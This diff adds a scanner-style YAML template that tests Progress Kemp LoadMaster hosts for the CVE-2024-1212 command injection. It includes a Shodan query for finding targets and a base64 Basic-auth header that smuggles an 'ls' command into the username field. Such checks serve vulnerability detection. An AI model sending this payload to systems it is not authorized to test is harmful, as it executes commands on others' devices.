@@ -1,0 +1,25 @@
+id: poc-yaml-progress-kemp-loadmaster-command-injection
+info:
+  name: Progress Kemp LoadMaster 命令注入漏洞(CVE-2024-1212)
+  severity: high
+  tags:
+  - CVE-2024-1212
+  - 两高一弱
+  finger: loadmaster
+  shodan: html\:"LoadMaster"
+requests:
+- method: GET
+  path: /access/set?param=enableapi&value=1
+  headers:
+    Authorization: Basic JztsczsnOmRvZXNub3RtYXR0ZXI=
+  expression: 'status_code == 200 &&
+
+    contains(body,"bin") &&
+
+    contains(body,"mnt") &&
+
+    contains(body,"WWW-Authenticate: Basic")
+
+    '
+variables: {}
+transport: http
